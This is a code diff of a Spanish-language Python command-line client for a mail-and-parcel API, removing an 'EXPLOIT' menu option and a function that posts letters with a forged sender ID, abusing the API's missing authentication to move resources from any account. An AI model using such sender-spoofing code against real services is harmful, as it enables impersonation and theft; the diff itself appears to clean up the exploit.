@@ -15,7 +15,6 @@ def mostrar_menu():
     print("5. POST /carta - Enviar una carta")
     print("6. POST /paquete - Enviar un paquete")
     print("7. DELETE /mail/{uid} - Eliminar un mail")
-    print("8. 🔓 EXPLOIT - Enviar paquete con remitente falso")
     print("0. Salir")
     print("="*60)
 
@@ -186,67 +185,6 @@ def delete_mail():
     except requests.exceptions.RequestException as e:
         print(f"✗ Error de conexión: {e}")
 
-def exploit_send_paquete():
-    """🔓 EXPLOIT - Envía un paquete falsificando el remitente"""
-    print("\n" + "⚠"*30)
-    print("⚠ MODO EXPLOIT - Vulnerabilidad de seguridad")
-    print("⚠ Esto explota la falta de autenticación de la API")
-    print("⚠"*30)
-    
-    print("\n--- Enviar Paquete con Remitente Falso ---")
-    print("Nota: Puedes enviar recursos de cualquier ID sin verificación\n")
-    
-    remitente_falso = input("ID del remitente (puede ser cualquiera): ").strip()
-    dest = input("Destinatario: ").strip()
-    
-    if not dest:
-        print("✗ El destinatario es obligatorio")
-        return
-    
-    print("\nIntroduce los recursos (deja vacío para terminar):")
-    recursos = {}
-    while True:
-        recurso = input("  Nombre del recurso (o Enter para terminar): ").strip()
-        if not recurso:
-            break
-        try:
-            cantidad = int(input(f"  Cantidad de {recurso}: ").strip())
-            recursos[recurso] = cantidad
-        except ValueError:
-            print("  ✗ La cantidad debe ser un número entero")
-    
-    if not recursos:
-        print("✗ Debes especificar al menos un recurso")
-        return
-    
-    print(f"\n🔓 Intentando enviar recursos de '{remitente_falso}' a '{dest}'...")
-    print(f"📦 Recursos: {recursos}")
-    
-    # Intentar enviar carta con remitente falso
-    url = f"{BASE_URL}/carta"
-    carta_data = {
-        "remi": remitente_falso,
-        "dest": dest,
-        "asunto": "Transferencia de recursos",
-        "cuerpo": f"Recursos: {json.dumps(recursos)}",
-        "id": f"exploit_{remitente_falso}_{dest}"
-    }
-    
-    try:
-        response = requests.post(url, json=carta_data)
-        if response.status_code == 200:
-            print("\n✓ ¡EXPLOIT EXITOSO!")
-            print(f"✓ Se envió una carta de '{remitente_falso}' a '{dest}' con recursos")
-            print("✓ La API no verificó la identidad del remitente")
-            print("\nRespuesta:", response.json())
-        elif response.status_code == 422:
-            print(f"\n✗ Error de validación (422)")
-            print("Detalle:", response.json())
-        else:
-            print(f"\n✗ Error {response.status_code}: {response.text}")
-    except requests.exceptions.RequestException as e:
-        print(f"\n✗ Error de conexión: {e}")
-
 def main():
     """Función principal del programa"""
     print("Bienvenido a la interfaz de la API")
@@ -269,8 +207,6 @@ def main():
             send_paquete()
         elif opcion == "7":
             delete_mail()
-        elif opcion == "8":
-            exploit_send_paquete()
         elif opcion == "0":
             print("\n¡Hasta luego!")
             break
